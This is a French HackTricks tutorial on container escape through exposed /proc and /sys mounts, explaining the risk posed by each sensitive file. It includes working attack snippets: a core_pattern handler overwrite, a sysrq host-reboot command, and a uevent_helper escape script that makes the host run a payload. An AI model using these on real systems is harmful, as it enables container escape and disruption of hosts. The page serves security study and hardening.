<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>


L'exposition de `/proc` et `/sys` sans une isolation de l'espace de noms appropriée présente des risques de sécurité importants, notamment l'agrandissement de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou consultés par un utilisateur non autorisé, peuvent entraîner une évasion de conteneur, une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, le montage incorrect de `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.

Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).

# Vulnérabilités procfs

## `/proc/sys`
Ce répertoire permet d'accéder à la modification des variables du noyau, généralement via `sysctl(2)`, et contient plusieurs sous-répertoires préoccupants :

### **`/proc/sys/kernel/core_pattern`**
- Décrit dans [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Permet de définir un programme à exécuter lors de la génération d'un fichier core avec les 128 premiers octets comme arguments. Cela peut entraîner une exécution de code si le fichier commence par un pipe `|`.
- **Exemple de test et d'exploitation** :
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Oui # Test d'accès en écriture
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Définit un gestionnaire personnalisé
sleep 5 && ./crash & # Déclenche le gestionnaire
```

### **`/proc/sys/kernel/modprobe`**
- Détail dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contient le chemin du chargeur de module du noyau, invoqué pour charger les modules du noyau.
- **Exemple de vérification d'accès** :
```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Vérifier l'accès à modprobe
```

### **`/proc/sys/vm/panic_on_oom`**
- Référencé dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Un indicateur global qui contrôle si le noyau panique ou invoque l'OOM killer lorsqu'une condition OOM se produit.

### **`/proc/sys/fs`**
- Selon [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contient des options et des informations sur le système de fichiers.
- L'accès en écriture peut permettre diverses attaques de déni de service contre l'hôte.

### **`/proc/sys/fs/binfmt_misc`**
- Permet d'enregistrer des interprètes pour des formats binaires non natifs en fonction de leur numéro magique.
- Peut entraîner une élévation de privilèges ou un accès au shell root si `/proc/sys/fs/binfmt_misc/register` est inscriptible.
- Exploit pertinent et explication :
- [Rootkit de pauvre homme via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutoriel approfondi : [Lien vidéo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## Autres dans `/proc`

### **`/proc/config.gz`**
- Peut révéler la configuration du noyau si `CONFIG_IKCONFIG_PROC` est activé.
- Utile pour les attaquants pour identifier les vulnérabilités dans le noyau en cours d'exécution.

### **`/proc/sysrq-trigger`**
- Permet d'invoquer des commandes Sysrq, provoquant potentiellement des redémarrages immédiats du système ou d'autres actions critiques.
- **Exemple de redémarrage de l'hôte** :
```bash
echo b > /proc/sysrq-trigger # Redémarre l'hôte
```

### **`/proc/kmsg`**
- Expose les messages du tampon de l'anneau du noyau.
- Peut aider dans les exploits du noyau, les fuites d'adresses et fournir des informations sensibles sur le système.

### **`/proc/kallsyms`**
- Liste les symboles exportés du noyau et leurs adresses.
- Essentiel pour le développement d'exploits du noyau, en particulier pour contourner le KASLR.
- Les informations d'adresse sont restreintes avec `kptr_restrict` défini sur `1` ou `2`.
- Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/[pid]/mem`**
- Interface avec le périphérique mémoire du noyau `/dev/mem`.
- Historiquement vulnérable aux attaques d'élévation de privilèges.
- Plus sur [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/kcore`**
- Représente la mémoire physique du système au format de noyau ELF.
- La lecture peut divulguer le contenu de la mémoire de l'hôte et des autres conteneurs.
- Une taille de fichier importante peut entraîner des problèmes de lecture ou des plantages logiciels.
- Utilisation détaillée dans [Dumping /proc/kcore en 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

### **`/proc/kmem`**
- Interface alternative pour `/dev/kmem`, représentant la mémoire virtuelle du noyau.
- Permet la lecture et l'écriture, donc la modification directe de la mémoire du noyau.

### **`/proc/mem`**
- Interface alternative pour `/dev/mem`, représentant la mémoire physique.
- Permet la lecture et l'écriture, la modification de toute la mémoire nécessite la résolution des adresses virtuelles en physiques.

### **`/proc/sched_debug`**
- Renvoie des informations de planification des processus, contournant les protections de l'espace de noms PID.
- Expose les noms de processus, les identifiants et les identifiants de cgroup.

### **`/proc/[pid]/mountinfo`**
- Fournit des informations sur les points de montage dans l'espace de noms de montage du processus.
- Expose l'emplacement du `rootfs` du conteneur ou de l'image.

## Vulnérabilités sys

### **`/sys/kernel/uevent_helper`**
- Utilisé pour gérer les `uevents` des périphériques du noyau.
- Écrire dans `/sys/kernel/uevent_helper` peut exécuter des scripts arbitraires lors de déclenchements `uevent`.
- **Exemple d'exploitation** :
%%%bash
# Crée une charge utile
echo "#!/bin/sh" > /evil-helper
echo "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Trouve le chemin de l'hôte depuis le montage OverlayFS pour le conteneur
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# Définit uevent_helper sur l'assistant malveillant
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Déclenche un uevent
echo change > /sys/class/mem/null/uevent
# Lit la sortie
cat /output
%%%

### **`/sys/class/thermal`**
- Contrôle les paramètres de température, pouvant causer des attaques DoS ou des dommages physiques.

### **`/sys/kernel/vmcoreinfo`**
- Fuites d'adresses du noyau, compromettant potentiellement le KASLR.

### **`/sys/kernel/security`**
- Héberge l'interface `securityfs`, permettant la configuration des modules de sécurité Linux comme AppArmor.
- L'accès pourrait permettre à un conteneur de désactiver son système MAC.

### **`/sys/firmware/efi/vars` et `/sys/firmware/efi/efivars`**
- Exposent des interfaces pour interagir avec les variables EFI dans la NVRAM.
- Une mauvaise configuration ou une exploitation peut rendre les ordinateurs portables inutilisables ou les machines hôtes non démarrables.

### **`/sys/kernel/debug`**
- `debugfs` offre une interface de débogage "sans règles" au noyau.
- Historique de problèmes de sécurité en raison de sa nature non restreinte.


# Références
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Comprendre et renforcer les conteneurs Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abus des conteneurs Linux privilégiés et non privilégiés](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
